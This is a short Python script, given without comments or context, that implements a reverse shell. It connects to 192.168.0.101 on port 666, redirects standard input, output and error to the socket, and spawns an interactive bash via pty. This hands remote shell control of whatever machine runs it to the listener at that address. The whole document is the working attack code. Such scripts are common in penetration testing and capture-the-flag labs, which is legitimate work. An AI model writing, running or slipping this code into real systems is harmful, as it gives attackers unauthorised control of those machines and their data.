import socket
import os
import pty

ip = '192.168.0.101'
port = 666

s = socket.socket()
s.connect((ip, port))

for fd in (0, 1, 2):
	os.dup2(s.fileno(), fd)

pty.spawn('/bin/bash')
